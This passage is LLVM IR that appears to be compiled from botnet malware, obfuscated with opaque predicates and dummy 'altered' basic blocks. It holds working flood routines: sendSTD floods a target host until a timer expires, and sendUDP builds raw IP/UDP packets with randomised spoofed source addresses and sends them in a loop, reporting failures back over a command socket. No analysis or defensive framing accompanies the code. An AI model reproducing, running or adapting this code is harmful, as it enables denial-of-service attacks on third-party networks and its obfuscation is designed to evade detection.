  %3890 = call i32 @sclose(i32 %3889)
  %3891 = load i32, i32* %2, align 4
  %3892 = sext i32 %3891 to i64
  %3893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3892
  %3894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3893, i32 0, i32 2
  store i8 0, i8* %3894, align 8
  %3895 = load i32, i32* %2, align 4
  %3896 = sext i32 %3895 to i64
  %3897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %3896
  %3898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %3897, i32 0, i32 3
  store i8 1, i8* %3898, align 1
  br label %originalBB319

originalBB323alteredBB:                           ; preds = %originalBB323, %3206
  br label %originalBB323

originalBB327alteredBB:                           ; preds = %originalBB327, %3228
  br label %originalBB327
}

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %7, align 4
  %13 = call i64 @time(i64* null) #2
  store i64 %13, i64* %8, align 8
  %14 = load i8*, i8** %4, align 8
  %15 = call %struct.hostent* @gethostbyname(i8* %14)
  store %struct.hostent* %15, %struct.hostent** %10, align 8
  %16 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 4, i1 false)
  %17 = load %struct.hostent*, %struct.hostent** %10, align 8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %17, i32 0, i32 4
  %19 = load i8**, i8*** %18, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %23 = bitcast %struct.in_addr* %22 to i8*
  %24 = load %struct.hostent*, %struct.hostent** %10, align 8
  %25 = getelementptr inbounds %struct.hostent, %struct.hostent* %24, i32 0, i32 3
  %26 = load i32, i32* %25, align 4
  %27 = sext i32 %26 to i64
  call void @bcopy(i8* %21, i8* %23, i64 %27) #2
  %28 = load %struct.hostent*, %struct.hostent** %10, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 2
  %30 = load i32, i32* %29, align 8
  %31 = trunc i32 %30 to i16
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %31, i16* %32, align 4
  %33 = load i32, i32* %5, align 4
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 0, i32* %11, align 4
  br label %36

; <label>:36:                                     ; preds = %87, %3
  %37 = load i32, i32* %11, align 4
  %38 = icmp uge i32 %37, 50
  br i1 %38, label %39, label %87

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* @x.71
  %41 = load i32, i32* @y.72
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = load i32, i32* %7, align 4
  %49 = call i64 @send(i32 %48, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0), i64 50, i32 0)
  %50 = load i32, i32* %7, align 4
  %51 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %52 = call i32 @connect(i32 %50, %struct.sockaddr* %51, i32 16)
  %53 = call i64 @time(i64* null) #2
  %54 = load i64, i64* %8, align 8
  %55 = load i32, i32* %6, align 4
  %56 = sext i32 %55 to i64
  %57 = add nsw i64 %54, %56
  %58 = icmp sge i64 %53, %57
  %59 = load i32, i32* @x.71
  %60 = load i32, i32* @y.72
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %58, label %67, label %70

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = load i32, i32* %7, align 4
  %69 = call i32 @close(i32 %68)
  call void @_exit(i32 0) #12
  unreachable

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i32, i32* @x.71
  %72 = load i32, i32* @y.72
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %70
  store i32 0, i32* %11, align 4
  %79 = load i32, i32* @x.71
  %80 = load i32, i32* @y.72
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %87

; <label>:87:                                     ; preds = %originalBBpart24, %36
  %88 = load i32, i32* %11, align 4
  %89 = add i32 %88, 1
  store i32 %89, i32* %11, align 4
  br label %36
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %39
  %91 = load i32, i32* %7, align 4
  %92 = call i64 @send(i32 %91, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i32 0, i32 0), i64 50, i32 0)
  %93 = load i32, i32* %7, align 4
  %94 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %95 = call i32 @connect(i32 %93, %struct.sockaddr* %94, i32 16)
  %96 = call i64 @time(i64* null) #2
  %97 = load i64, i64* %8, align 8
  %98 = load i32, i32* %6, align 4
  %99 = sext i32 %98 to i64
  %_ = sub i64 0, %97
  %gen = add i64 %_, %99
  %100 = add nsw i64 %97, %99
  %101 = icmp sge i64 %96, %100
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %70
  store i32 0, i32* %11, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = load i32, i32* @x.73
  %8 = load i32, i32* @y.74
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.sockaddr_in, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  store i8* %0, i8** %15, align 8
  store i32 %1, i32* %16, align 4
  store i32 %2, i32* %17, align 4
  store i32 %3, i32* %18, align 4
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %36, align 4
  %37 = load i32, i32* %16, align 4
  %38 = icmp eq i32 %37, 0
  %39 = load i32, i32* @x.73
  %40 = load i32, i32* @y.74
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %67

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* @x.73
  %49 = load i32, i32* @y.74
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = call i32 @rand_cmwc()
  %57 = trunc i32 %56 to i16
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %57, i16* %58, align 2
  %59 = load i32, i32* @x.73
  %60 = load i32, i32* @y.74
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %72

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = load i32, i32* %16, align 4
  %69 = trunc i32 %68 to i16
  %70 = call zeroext i16 @htons(i16 zeroext %69) #13
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %70, i16* %71, align 2
  br label %72

; <label>:72:                                     ; preds = %67, %originalBBpart24
  %73 = load i8*, i8** %15, align 8
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %75 = call i32 @getHost(i8* %73, %struct.in_addr* %74)
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %78

; <label>:77:                                     ; preds = %72
  br label %421

; <label>:78:                                     ; preds = %72
  %79 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 3
  %80 = getelementptr inbounds [8 x i8], [8 x i8]* %79, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %80, i8 0, i64 8, i32 4, i1 false)
  %81 = load i32, i32* %20, align 4
  store i32 %81, i32* %22, align 4
  %82 = load i32, i32* %18, align 4
  %83 = icmp eq i32 %82, 32
  br i1 %83, label %84, label %187

; <label>:84:                                     ; preds = %78
  %85 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %85, i32* %23, align 4
  %86 = load i32, i32* %23, align 4
  %87 = icmp ne i32 %86, 0
  br i1 %87, label %91, label %88

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* @mainCommSock, align 4
  %90 = call i32 (i32, i8*, ...) @sockprintf(i32 %89, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  br label %421

; <label>:91:                                     ; preds = %84
  %92 = load i32, i32* %19, align 4
  %93 = add nsw i32 %92, 1
  %94 = sext i32 %93 to i64
  %95 = call noalias i8* @malloc(i64 %94) #2
  store i8* %95, i8** %24, align 8
  %96 = load i8*, i8** %24, align 8
  %97 = icmp eq i8* %96, null
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %91
  br label %421

; <label>:99:                                     ; preds = %91
  %100 = load i8*, i8** %24, align 8
  %101 = load i32, i32* %19, align 4
  %102 = add nsw i32 %101, 1
  %103 = sext i32 %102 to i64
  call void @llvm.memset.p0i8.i64(i8* %100, i8 0, i64 %103, i32 1, i1 false)
  %104 = load i8*, i8** %24, align 8
  %105 = load i32, i32* %19, align 4
  call void @makeRandomStr(i8* %104, i32 %105)
  %106 = call i64 @time(i64* null) #2
  %107 = load i32, i32* %17, align 4
  %108 = sext i32 %107 to i64
  %109 = add nsw i64 %106, %108
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %111

; <label>:111:                                    ; preds = %167, %166, %99
  %112 = load i32, i32* %23, align 4
  %113 = load i8*, i8** %24, align 8
  %114 = load i32, i32* %19, align 4
  %115 = sext i32 %114 to i64
  %116 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %117 = call i64 @sendto(i32 %112, i8* %113, i64 %115, i32 0, %struct.sockaddr* %116, i32 16)
  %118 = load i32, i32* %26, align 4
  %119 = load i32, i32* %22, align 4
  %120 = icmp eq i32 %118, %119
  br i1 %120, label %121, label %167

; <label>:121:                                    ; preds = %111
  %122 = load i32, i32* @x.73
  %123 = load i32, i32* @y.74
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %121
  %130 = load i32, i32* %16, align 4
  %131 = icmp eq i32 %130, 0
  %132 = load i32, i32* @x.73
  %133 = load i32, i32* @y.74
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %131, label %140, label %160

; <label>:140:                                    ; preds = %originalBBpart28
  %141 = load i32, i32* @x.73
  %142 = load i32, i32* @y.74
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %140
  %149 = call i32 @rand_cmwc()
  %150 = trunc i32 %149 to i16
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %150, i16* %151, align 2
  %152 = load i32, i32* @x.73
  %153 = load i32, i32* @y.74
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %160

; <label>:160:                                    ; preds = %originalBBpart212, %originalBBpart28
  %161 = call i64 @time(i64* null) #2
  %162 = load i32, i32* %25, align 4
  %163 = sext i32 %162 to i64
  %164 = icmp sgt i64 %161, %163
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %160
  br label %170

; <label>:166:                                    ; preds = %160
  store i32 0, i32* %26, align 4
  br label %111

; <label>:167:                                    ; preds = %111
  %168 = load i32, i32* %26, align 4
  %169 = add i32 %168, 1
  store i32 %169, i32* %26, align 4
  br label %111

; <label>:170:                                    ; preds = %165
  %171 = load i32, i32* @x.73
  %172 = load i32, i32* @y.74
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %170
  %179 = load i32, i32* @x.73
  %180 = load i32, i32* @y.74
  %181 = sub i32 %179, 1
  %182 = mul i32 %179, %181
  %183 = urem i32 %182, 2
  %184 = icmp eq i32 %183, 0
  %185 = icmp slt i32 %180, 10
  %186 = or i1 %184, %185
  br i1 %186, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %421

; <label>:187:                                    ; preds = %78
  %188 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %188, i32* %27, align 4
  %189 = load i32, i32* %27, align 4
  %190 = icmp ne i32 %189, 0
  br i1 %190, label %194, label %191

; <label>:191:                                    ; preds = %187
  %192 = load i32, i32* @mainCommSock, align 4
  %193 = call i32 (i32, i8*, ...) @sockprintf(i32 %192, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.82, i32 0, i32 0))
  br label %421

; <label>:194:                                    ; preds = %187
  %195 = load i32, i32* @x.73
  %196 = load i32, i32* @y.74
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %194
  store i32 1, i32* %28, align 4
  %203 = load i32, i32* %27, align 4
  %204 = bitcast i32* %28 to i8*
  %205 = call i32 @setsockopt(i32 %203, i32 0, i32 3, i8* %204, i32 4) #2
  %206 = icmp slt i32 %205, 0
  %207 = load i32, i32* @x.73
  %208 = load i32, i32* @y.74
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %206, label %215, label %218

; <label>:215:                                    ; preds = %originalBBpart220
  %216 = load i32, i32* @mainCommSock, align 4
  %217 = call i32 (i32, i8*, ...) @sockprintf(i32 %216, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.83, i32 0, i32 0))
  br label %421

; <label>:218:                                    ; preds = %originalBBpart220
  store i32 50, i32* %29, align 4
  br label %219

; <label>:219:                                    ; preds = %223, %218
  %220 = load i32, i32* %29, align 4
  %221 = add nsw i32 %220, -1
  store i32 %221, i32* %29, align 4
  %222 = icmp ne i32 %220, 0
  br i1 %222, label %223, label %230

; <label>:223:                                    ; preds = %219
  %224 = call i64 @time(i64* null) #2
  %225 = call i32 @rand_cmwc()
  %226 = zext i32 %225 to i64
  %227 = xor i64 %224, %226
  %228 = trunc i64 %227 to i32
  call void @srand(i32 %228) #2
  %229 = call i32 @rand() #2
  call void @init_rand(i32 %229)
  br label %219

; <label>:230:                                    ; preds = %219
  %231 = load i32, i32* %18, align 4
  %232 = icmp eq i32 %231, 0
  br i1 %232, label %233, label %234

; <label>:233:                                    ; preds = %230
  store i32 0, i32* %30, align 4
  br label %240

; <label>:234:                                    ; preds = %230
  %235 = load i32, i32* %18, align 4
  %236 = sub nsw i32 32, %235
  %237 = shl i32 1, %236
  %238 = sub nsw i32 %237, 1
  %239 = xor i32 %238, -1
  store i32 %239, i32* %30, align 4
  br label %240

; <label>:240:                                    ; preds = %234, %233
  %241 = load i32, i32* %19, align 4
  %242 = sext i32 %241 to i64
  %243 = add i64 28, %242
  %244 = call i8* @llvm.stacksave()
  store i8* %244, i8** %31, align 8
  %245 = alloca i8, i64 %243, align 16
  %246 = bitcast i8* %245 to %struct.iphdr*
  store %struct.iphdr* %246, %struct.iphdr** %32, align 8
  %247 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %248 = bitcast %struct.iphdr* %247 to i8*
  %249 = getelementptr i8, i8* %248, i64 20
  %250 = bitcast i8* %249 to %struct.udphdr*
  store %struct.udphdr* %250, %struct.udphdr** %33, align 8
  %251 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %252 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %253 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %252, i32 0, i32 0
  %254 = load i32, i32* %253, align 4
  %255 = load i32, i32* %30, align 4
  %256 = call i32 @getRandomIP(i32 %255)
  %257 = call i32 @htonl(i32 %256) #13
  %258 = load i32, i32* %19, align 4
  %259 = sext i32 %258 to i64
  %260 = add i64 8, %259
  %261 = trunc i64 %260 to i32
  call void @makeIPPacket(%struct.iphdr* %251, i32 %254, i32 %257, i8 zeroext 17, i32 %261)
  %262 = load i32, i32* %19, align 4
  %263 = sext i32 %262 to i64
  %264 = add i64 8, %263
  %265 = trunc i64 %264 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #13
  %267 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 0
  %269 = bitcast %union.anon.3* %268 to %struct.anon.4*
  %270 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %269, i32 0, i32 2
  store i16 %266, i16* %270, align 2
  %271 = call i32 @rand_cmwc()
  %272 = trunc i32 %271 to i16
  %273 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %274 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %273, i32 0, i32 0
  %275 = bitcast %union.anon.3* %274 to %struct.anon.4*
  %276 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %275, i32 0, i32 0
  store i16 %272, i16* %276, align 2
  %277 = load i32, i32* %16, align 4
  %278 = icmp eq i32 %277, 0
  br i1 %278, label %279, label %281

; <label>:279:                                    ; preds = %240
  %280 = call i32 @rand_cmwc()
  br label %286

; <label>:281:                                    ; preds = %240
  %282 = load i32, i32* %16, align 4
  %283 = trunc i32 %282 to i16
  %284 = call zeroext i16 @htons(i16 zeroext %283) #13
  %285 = zext i16 %284 to i32
  br label %286

; <label>:286:                                    ; preds = %281, %279
  %287 = phi i32 [ %280, %279 ], [ %285, %281 ]
  %288 = trunc i32 %287 to i16
  %289 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %290 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %289, i32 0, i32 0
  %291 = bitcast %union.anon.3* %290 to %struct.anon.4*
  %292 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %291, i32 0, i32 1
  store i16 %288, i16* %292, align 2
  %293 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 0
  %295 = bitcast %union.anon.3* %294 to %struct.anon.4*
  %296 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %295, i32 0, i32 3
  store i16 0, i16* %296, align 2
  %297 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %298 = bitcast %struct.udphdr* %297 to i8*
  %299 = getelementptr inbounds i8, i8* %298, i64 8
  %300 = load i32, i32* %19, align 4
  call void @makeRandomStr(i8* %299, i32 %300)
  %301 = bitcast i8* %245 to i16*
  %302 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 2
  %304 = load i16, i16* %303, align 2
  %305 = zext i16 %304 to i32
  %306 = call zeroext i16 @csum(i16* %301, i32 %305)
  %307 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %308 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %307, i32 0, i32 7
  store i16 %306, i16* %308, align 2
  %309 = call i64 @time(i64* null) #2
  %310 = load i32, i32* %17, align 4
  %311 = sext i32 %310 to i64
  %312 = add nsw i64 %309, %311
  %313 = trunc i64 %312 to i32
  store i32 %313, i32* %34, align 4
  store i32 0, i32* %35, align 4
  br label %314

; <label>:314:                                    ; preds = %416, %originalBBpart232, %286
  %315 = load i32, i32* @x.73
  %316 = load i32, i32* @y.74
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %314
  %323 = load i32, i32* @x.73
  %324 = load i32, i32* @y.74
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %331

; <label>:331:                                    ; preds = %originalBBpart224
  %332 = load i32, i32* %27, align 4
  %333 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  %334 = call i64 @sendto(i32 %332, i8* %245, i64 %243, i32 0, %struct.sockaddr* %333, i32 16)
  %335 = call i32 @rand_cmwc()
  %336 = trunc i32 %335 to i16
  %337 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %338 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %337, i32 0, i32 0
  %339 = bitcast %union.anon.3* %338 to %struct.anon.4*
  %340 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %339, i32 0, i32 0
  store i16 %336, i16* %340, align 2
  %341 = load i32, i32* %16, align 4
  %342 = icmp eq i32 %341, 0
  br i1 %342, label %343, label %345

; <label>:343:                                    ; preds = %331
  %344 = call i32 @rand_cmwc()
  br label %350

; <label>:345:                                    ; preds = %331
  %346 = load i32, i32* %16, align 4
  %347 = trunc i32 %346 to i16
  %348 = call zeroext i16 @htons(i16 zeroext %347) #13
  %349 = zext i16 %348 to i32
  br label %350

; <label>:350:                                    ; preds = %345, %343
  %351 = phi i32 [ %344, %343 ], [ %349, %345 ]
  %352 = trunc i32 %351 to i16
  %353 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %354 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %353, i32 0, i32 0
  %355 = bitcast %union.anon.3* %354 to %struct.anon.4*
  %356 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %355, i32 0, i32 1
  store i16 %352, i16* %356, align 2
  %357 = call i32 @rand_cmwc()
  %358 = trunc i32 %357 to i16
  %359 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %360 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %359, i32 0, i32 3
  store i16 %358, i16* %360, align 4
  %361 = load i32, i32* %30, align 4
  %362 = call i32 @getRandomIP(i32 %361)
  %363 = call i32 @htonl(i32 %362) #13
  %364 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %365 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %364, i32 0, i32 8
  store i32 %363, i32* %365, align 4
  %366 = bitcast i8* %245 to i16*
  %367 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i32 0, i32 2
  %369 = load i16, i16* %368, align 2
  %370 = zext i16 %369 to i32
  %371 = call zeroext i16 @csum(i16* %366, i32 %370)
  %372 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %373 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %372, i32 0, i32 7
  store i16 %371, i16* %373, align 2
  %374 = load i32, i32* %35, align 4
  %375 = load i32, i32* %22, align 4
  %376 = icmp eq i32 %374, %375
  br i1 %376, label %377, label %416

; <label>:377:                                    ; preds = %350
  %378 = load i32, i32* @x.73
  %379 = load i32, i32* @y.74
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %377
  %386 = call i64 @time(i64* null) #2
  %387 = load i32, i32* %34, align 4
  %388 = sext i32 %387 to i64
  %389 = icmp sgt i64 %386, %388
  %390 = load i32, i32* @x.73
  %391 = load i32, i32* @y.74
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %389, label %398, label %399

; <label>:398:                                    ; preds = %originalBBpart228
  br label %419

; <label>:399:                                    ; preds = %originalBBpart228
  %400 = load i32, i32* @x.73
  %401 = load i32, i32* @y.74
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %399
  store i32 0, i32* %35, align 4
  %408 = load i32, i32* @x.73
  %409 = load i32, i32* @y.74
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %314

; <label>:416:                                    ; preds = %350
  %417 = load i32, i32* %35, align 4
  %418 = add i32 %417, 1
  store i32 %418, i32* %35, align 4
  br label %314

; <label>:419:                                    ; preds = %398
  %420 = load i8*, i8** %31, align 8
  call void @llvm.stackrestore(i8* %420)
  br label %421

; <label>:421:                                    ; preds = %419, %215, %191, %originalBBpart216, %98, %88, %77
  %422 = load i32, i32* @x.73
  %423 = load i32, i32* @y.74
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
